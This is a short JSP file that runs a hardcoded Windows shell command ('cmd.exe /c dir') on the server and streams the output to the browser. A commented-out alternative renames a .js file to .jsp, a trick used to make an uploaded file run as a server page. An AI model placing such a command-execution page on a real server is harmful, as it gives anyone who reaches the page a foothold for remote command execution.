<%@page import="java.io.OutputStream"%>
<%@page import="java.io.InputStream"%>
<%@page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8" %>
<%
	Runtime run = Runtime.getRuntime();
	String[] cmd = {"cmd.exe", "/c", "dir"};
// 	String[] cmd = {"cmd.exe", "/c", "rename", "run.js", "rename.jsp"};
	Process process = run.exec(cmd);
	InputStream is = process.getInputStream();

	response.setContentType("text/plain;charset=utf-8;");
	
 	out.clear();
 	out = pageContext.pushBody();
	
	OutputStream os = response.getOutputStream();
	
	while(true) {
		int data = is.read();
		if(data < 0) break;
		os.write(data);
	}
	os.flush();
	os.close();
	is.close();
%>